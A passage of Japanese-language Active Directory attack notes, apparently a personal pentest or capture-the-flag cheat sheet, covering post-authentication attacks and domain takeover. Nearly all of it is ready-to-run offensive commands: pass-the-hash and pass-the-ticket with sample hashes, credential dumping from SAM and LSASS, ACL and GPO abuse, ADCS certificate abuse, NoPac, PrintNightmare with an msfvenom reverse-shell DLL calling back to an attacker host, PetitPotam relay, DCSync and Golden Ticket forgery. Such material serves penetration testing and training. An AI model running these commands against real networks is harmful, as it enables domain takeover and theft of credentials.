.\Rubeus.exe ptt /ticket:<BASE64_TICKET_OR_KIRBI_FILE>
```

### runas /netonly（PtP）

他のユーザーで PowerShell を取得する。

```cmd
C:\htb> runas /netonly /user:htb.local\jackie.may powershell
```

### impacket-psexec（PtH）

```sh
impacket-psexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

### impacket-wmiexec（PtH）

```sh
impacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

### 認証後に試すこと

管理者権限のアカウントが見つかったら、CrackMapExec で以下も試す。

- `--local-auth --sam` : SAM に含まれているハッシュをダンプ
- `--local-auth -M lsassy` : mimikatz の主な攻撃対象の LSASS に含まれている資格情報をダンプ
- `--local-auth --shares` : SMB 共有の列挙
- `-M keepass_discover` : KeePass ファイルの探索
- `-M gpp_password` : GPP パスワードの探索
- `-M wdigest` : WDigest 認証の設定を確認し、メモリに平文パスワードが残っているかを探る
- `-M wireless` : インターネットの認証情報と SSID

## ダブルホップ

### Invoke-Command

PSCredential オブジェクトを使用して明示的に認証情報を渡し、2ホップ先のリソースにアクセスする。

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
Invoke-Command -ComputerName <HOP1_TARGET> -ScriptBlock { Invoke-Command -ComputerName <HOP2_TARGET> -ScriptBlock { whoami } -Credential $using:Cred } -Credential $Cred
```


# 4. 掌握・永続化

## ACL悪用

列挙は [[#ACL・委任・信頼関係]]。

読み込み: [[#PowerViewの読み込み]]

発見した ACL の権限を利用して、パスワード変更、グループ追加、SPN 書き換えなどを行う。

### パスワード変更

```powershell
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword <NEW_PASS_OBJ> -Credential <CRED_OBJ>
```

### グループ追加

```powershell
Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<USER_TO_ADD>' -Credential <CRED_OBJ>
```

### SPN書き換え

Kerberoast の準備。

```powershell
Set-DomainObject -Credential <CRED_OBJ> -Identity <TARGET_USER> -SET @{serviceprincipalname='fake/spn'}
```

## GPO悪用

列挙は [[#GPO]]。

### SharpGPOAbuse

GPO の書き込み権限を悪用して、ローカル管理者追加やスケジュールタスク作成を行う。

- ローカル管理者追加
```powershell
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER_TO_ADD> --GPOName "<GPO_NAME>"
```
- タスク作成
```powershell
SharpGPOAbuse.exe --AddTask --TaskName "<TASK_NAME>" --Command "<COMMAND>" --Arguments "<ARGS>" --GPOName "<GPO_NAME>"
```

### pyGPOAbuse

ダウンロード。

```sh
git clone https://github.com/Hackndo/pyGPOAbuse
pip install -r requirements.txt
```

GPOADM を管理者グループに追加する。
- `31B2F340-016D-11D2-945F-00C04FB984F9` は Default Domain Policy の SID

```sh
┌──(venv)─(kali㉿kali)-[~/Desktop/HTB/BabyTwo/pyGPOAbuse]
└─$ python pygpoabuse.py baby2.vl/GPOADM:SuperPass123! -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -command 'net localgroup administrators GPOADM /add' -f
[+] ScheduledTask TASK_c0847a16 created!
```

## ADCS悪用

検出は [[#ADCS]]。

### 証明書要求

```sh
certipy-ad req -username 'SUSANNA_MCKNIGHT@thm.local' -password 'CHANGEME2023!' -ca thm-LABYRINTH-CA -target labyrinth.thm.local -template ServerAuth -upn Administrator@thm.local -sid 'xxxxxx'
```

- ESC1 は SID がないと PKINIT を弾かれる → `KDC_ERROR_CLIENT_NOT_TRUSTED` の原因になる
- ESC8 の攻撃手法
	- [[VulnCicada#ESC8の脆弱を利用した攻撃]]

### TGT取得

NTLM ハッシュを要求する。取得できたら `smbexec.py` などで使える。

```sh
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.133.131
```

## 既知脆弱性

### NoPac

SamAccountName Spoofing - CVE-2021-42278 & CVE-2021-42287
ドメインユーザーからドメイン管理者へ昇格できる脆弱性を悪用する。

- スキャン
```shell
sudo python3 scanner.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -use-ldap
```
- SYSTEM シェル取得
```shell
sudo python3 noPac.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> -shell --impersonate administrator -use-ldap
```

### PrintNightmare

RCE via Print Spooler - CVE-2021-34527, CVE-2021-1675
プリントスプーラーサービスの脆弱性を利用してリモートコード実行や権限昇格を行う。

- RPC 確認
```shell
rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'
```
- DLL ペイロード作成
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll > payload.dll
```
- SMB 共有
```shell
sudo smbserver.py -smb2support SHARE_NAME /path/to/payload_dll_folder/
```
- エクスプロイト実行
```shell
sudo python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> '\\\\<ATTACKER_IP>\\SHARE_NAME\\payload.dll'
```

### PetitPotam

NTLM Relay via MS-EFSRPC -> AD CS -> DC Cert -> DCSync
MS-EFSRPC プロトコルを悪用して NTLM リレーを行い、AD CS 経由で DC の証明書を取得し DCSync へ。

- NTLM リレー（ntlmrelayx.py）
```shell
sudo ntlmrelayx.py -debug -smb2support --target http://<CA_SERVER_FQDN>/certsrv/certfnsh.asp --adcs --template DomainController
```
- PetitPotam トリガー
```shell
python3 PetitPotam.py <ATTACKER_IP_FOR_NTLMRELAYX> <DC_IP_TO_COERCE>
```
- 証明書から TGT 取得（gettgtpkinit.py）
```shell
python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_HOSTNAME>\$ -pfx-base64 <BASE64_CERT> dc_ticket.ccache
```
- TGT で DCSync
```shell
export KRB5CCNAME=dc_ticket.ccache;
```

```shell
secretsdump.py -k -no-pass -just-dc-user <DOMAIN>/administrator "<DC_HOSTNAME>\$"@<DC_FQDN>
```

### MS14-068

Kerberos PAC 偽造。Kerberos チケットの PAC（特権属性証明書）を偽造し、ドメイン管理者へ昇格する脆弱性（PyKEK, Impacket）。

## DCSync

ドメイン全体のハッシュ取得。DS-Replication-Get-Changes 権限を悪用する。

### secretsdump.py

- パスワード使用
```shell
impacket-secretsdump -just-dc -outputfile domain_hashes <DOMAIN>/<DA_USER>@<DC_IP>
```
- NTLM ハッシュ使用
```shell
impacket-secretsdump -just-dc -outputfile domain_hashes -hashes <LMHASH:NTHASH> <DOMAIN>/<DA_USER>@<DC_IP>
```
- Kerberos チケット使用
```shell
export KRB5CCNAME=<TICKET.CCACHE>;
```

```shell
secretsdump.py -k -no-pass -just-dc <DOMAIN>/<DA_USER_IMPERSONATED>@<DC_IP>
```

- ハッシュを直接指定する例
```sh
impacket-secretsdump -hashes :b2c03054c306ac8fc5f9d188710b0168 Administrator@192.168.191.121 -just-dc
```

### Mimikatz（DCSync）

ドメイン管理者権限のコンテキストで実行する。

```powershell
privilege::debug
lsadump::dcsync /domain:<DOMAIN_FQDN> /all /csv
lsadump::dcsync /domain:<DOMAIN_FQDN> /user:krbtgt
```

## Golden Ticket

永続的なドメイン管理者アクセス。KRBTGT アカウントのハッシュを使用して、任意のユーザーとして長期間有効な TGT を偽造する。

- KRBTGT ハッシュは DCSync で取得する
- Mimikatz（Windows）

```powershell
kerberos::golden /user:<ADMIN_USER_TO_CREATE> /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
```

## SID History と ExtraSIDs

子ドメインの KRBTGT ハッシュと親ドメインの特権グループ SID を使用して Golden Ticket を作成し、親ドメインを掌握する（子 → 親）。

### Mimikatz（SID History）

```powershell
kerberos::golden /user:<FAKE_USER> /domain:<CHILD_DOMAIN_FQDN> /sid:<CHILD_DOMAIN_SID> /krbtgt:<CHILD_KRBTGT_HASH> /sids:<PARENT_ENTERPRISE_ADMIN_SID> /ptt
```

### Rubeus（SID History）

```powershell
.\Rubeus.exe golden /rc4:<CHILD_KRBTGT_HASH> /domain:<CHILD_DOMAIN_FQDN> /sid:<CHILD_DOMAIN_SID> /sids:<PARENT_ENTERPRISE_ADMIN_SID> /user:<FAKE_USER> /ptt
```

### ticketer.py

```shell
ticketer.py -nthash <CHILD_KRBTGT_HASH> -domain <CHILD_DOMAIN_FQDN> -domain-sid <CHILD_DOMAIN_SID> -extra-sid <PARENT_ENTERPRISE_ADMIN_SID> <FAKE_USER>
```

```shell
export KRB5CCNAME=<FAKE_USER.ccache>
```

```shell
psexec.py <CHILD_DOMAIN_FQDN>/<FAKE_USER>@<PARENT_DC_FQDN> -k -no-pass -target-ip <PARENT_DC_IP>
```

## Exchange関連グループ

PrivExchange など。Exchange 関連の特権グループ（`Exchange Windows Permissions`, `Organization Management`）を悪用する。

## WinRMの有効化

WinRM を有効化する GPO を作成する。

```sh
New-GPO -Name "Enable WinRM" | New-GPLink -Target "OU=Computers,DC=domain,DC=com"
```


# 5. ツール準備

## PowerViewの読み込み

PowerView はこいつしか信用するな。

```sh
wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
```

読み込み方。

```powershell
# 1) ドットソース（前に「.（ドット）+ 半角スペース」必須）
. .\PowerView.ps1

# 2) IEXで読み込み
IEX (Get-Content .\PowerView.ps1 -Raw)

# 3) 実行ポリシーで止まる時は一時的にバイパス
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
. .\PowerView.ps1
```

## RSAT

RSAT がインストールされている場合、Active Directory Users and Computers や ADSI Edit で列挙できる。
インストールの確認は [[#RSATの有無]]。

ADSI Edit を起動する。
- MMC は Microsoft Management Console

```sh
runas /netonly /user:freightlogistics.local\sally.jones "mmc %SystemRoot%\system32\adsiedit.msc"
```

MMC をドメインユーザーとして実行。

```cmd
runas /netonly /user:Domain_Name\Domain_USER mmc
```

## モジュール一覧

CrackMapExec のモジュール一覧を検索する。

```sh
crackmapexec smb -L
```
